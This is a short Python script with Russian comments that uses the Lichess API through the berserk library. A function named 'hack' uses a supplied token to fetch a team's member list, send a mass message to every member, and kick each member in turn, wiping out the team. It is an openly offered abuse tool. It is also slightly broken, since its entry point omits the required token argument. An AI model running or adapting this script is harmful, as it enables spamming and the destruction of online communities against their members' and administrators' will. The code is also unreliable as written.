import berserk # парсер для личесса
from berserk.session import Requestor
import ndjson # джейсон специально для лича Lichess.org
import requests # реквесты

from config import * #  # инициализируем все из конфига


def hack(team, token):
    session = berserk.TokenSession(token) # делаем сессию с токеном
    client = berserk.Client(session=session) # делаем клиентскую сессию с этим токеном

    r = requests.get(f'https://{SERVER}/{API}/{TEAM}/' + team + f'/{USERS}') # получаем список пользователей указанной команды
    data = r.json(cls=ndjson.Decoder) # декодируем полученную инфу

    print(green + "[+] Список пользователей получен!") # печатаем об успешном получении пользователей
    client.teams.message_all(team, msg)
    print("[+] Рассылка успешна отправлена!") # сообщаем об успешном отправлении рассылки

    for i in data: # перебор пользователей
        user = i[f'{JSON_NAME}'] # получаем имя каждого пользователя
        client.teams.kick_member(team, user) # кикаем пользователя за пользователем
        print(f"[+] {user} кикнут!") # сообщаем о кике


if __name__ == "__main__":
    hack(team=input(magenta + "[?] ID команды: " + white)) # первичная попытка
